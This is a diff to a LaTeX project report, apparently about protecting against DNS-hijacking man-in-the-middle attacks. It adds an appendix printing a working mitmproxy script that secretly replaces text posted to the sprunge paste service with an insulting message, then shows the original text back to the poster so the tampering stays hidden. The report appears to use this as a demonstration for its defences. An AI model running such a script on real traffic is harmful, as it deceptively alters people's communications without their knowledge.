@@ -769,7 +769,7 @@ Thank you very much for the feedback. Your suggestion on X sounds legit. I will 
 
 \subsubsection{With MITM attack by DNS hijacking, without protection}
 \paragraph{}
-Following commands are used to prepare MITM attack by DNS hijacking.
+Following commands are used to prepare MITM attack by DNS hijacking. The script used by mitmproxy is available at \cref{sec:mitmattack.py}.
 \begin{lstlisting}[language={},breaklines=true,postbreak=\mbox{\textcolor{red}{$\hookrightarrow$}\space}]
 - Computer 1, Terminal 2
 > sudo kill $(ps -ef |grep dnsmasq|grep yongbin -m 1|sed "s/\w* *//"|cut -d " " -s -f 1)
@@ -1046,6 +1046,40 @@ It is a text file with lines of regular expressions. Lines starting with \# are 
 \section{ip\_subnet\_blacklist.txt}\label{sec:ip_subnet_blacklist.txt}
 \paragraph{}
 It is a text file with lines of IP subnets. Lines starting with \# are treated as comments and are ignored. IP addresses matching any one of the subnets in the file will be blocked.
+
+\section{mitmattack.py}\label{sec:mitmattack.py}
+\begin{lstlisting}[language=Python,breaklines=true,postbreak=\mbox{\textcolor{red}{$\hookrightarrow$}\space}]
+#!/bin/python3
+from mitmproxy import http
+import logging
+
+hidden_truth={}
+what_others_see="Who do you think you are? How dare you to give me suggestions like this? Your naive ideas will never work. You have been blocked. *NEVER* send me emails again."
+
+def request(flow: http.HTTPFlow) -> None:
+  if flow.request.text:
+    if 'Content-Disposition: form-data; name="sprunge"' in flow.request.text:
+      lines = flow.request.text.split("\r\n")
+      setattr(flow, "spurnge", lines[3:-2])
+      lines = lines[:3] + [what_others_see] + lines[-2:]
+      flow.request.text = "\r\n".join(lines)
+  for url, text in hidden_truth.items():
+    print(url, flow.request.url)
+    if flow.request.url.startswith(url):
+      setattr(flow, "binyong", text)
+      print(1111)
+      break	  
+
+def response(flow: http.HTTPFlow) -> None:
+  if hasattr(flow, "spurnge"):
+    truth = "\r\n".join(flow.spurnge)
+    hidden_truth[flow.response.text.strip()] = truth
+    hidden_truth["https" + flow.response.text.strip()[4:]] = truth
+    print(flow.response.text)
+  if hasattr(flow, "binyong"):
+    flow.response.text = flow.binyong
+    print(flow.response.text)
+\end{lstlisting}
 
 \section{nftables.conf}\label{sec:nftables.conf}
 \begin{lstlisting}[language={},breaklines=true,postbreak=\mbox{\textcolor{red}{$\hookrightarrow$}\space}]
